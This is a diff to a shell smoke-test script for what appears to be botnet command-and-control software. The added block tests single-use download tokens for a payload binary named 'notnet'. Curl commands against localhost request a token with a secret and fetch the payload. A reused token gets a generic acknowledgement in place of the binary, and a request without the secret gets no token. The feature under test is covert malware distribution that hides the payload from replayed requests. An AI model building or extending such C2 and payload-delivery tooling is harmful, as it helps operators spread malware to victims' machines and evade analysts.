@@ -95,6 +95,24 @@ curl -s -X POST "http://127.0.0.1:$PORT_HTTP/api/v1/bot" \
 sleep 2
 grep -q "AUTH-FAIL.*evil" "$C2LOG" || { echo "FAIL: no AUTH-FAIL logged"; fail=1; }
 
+# ── #190: single-use download tokens ────────────────────────────────────
+echo "[5b/7] HTTP: #190 token issue + single-use download"
+TOKRESP=$(curl -s "http://127.0.0.1:$PORT_PAY/bot/token?secret=$SECRET")
+TOK=$(printf '%s' "$TOKRESP" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("token",""))')
+[ -n "$TOK" ] || { echo "FAIL: no token issued ($TOKRESP)"; fail=1; }
+# first use: token fetches the payload binary
+curl -s "http://127.0.0.1:$PORT_PAY/bot/notnet?token=$TOK" -o "$WORK/tok-dl.bin"
+cmp -s "$WORK/tok-dl.bin" ../notnet || { echo "FAIL: token download != payload"; fail=1; }
+# second use: consumed — must get the generic ok-ack, not the binary
+REUSE=$(curl -s "http://127.0.0.1:$PORT_PAY/bot/notnet?token=$TOK")
+printf '%s' "$REUSE" | grep -q '"status": "ok"' \
+  || { echo "FAIL: token reuse did not get ok-ack: $REUSE"; fail=1; }
+printf '%s' "$REUSE" | cmp -s - ../notnet \
+  && { echo "FAIL: token reuse returned the payload"; fail=1; }
+# token endpoint without the secret must NOT issue a token
+NOTOK=$(curl -s "http://127.0.0.1:$PORT_PAY/bot/token" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("token",""))')
+[ -z "$NOTOK" ] || { echo "FAIL: token issued without secret"; fail=1; }
+
 echo "[6/7] HTTP: bot stays connected (no autonomous spread)"
 docker logs c2smoke-bot 2>&1 | grep -q "Local spread cycle started" \
   && { echo "FAIL: bot went autonomous (connection dropped)"; fail=1; }
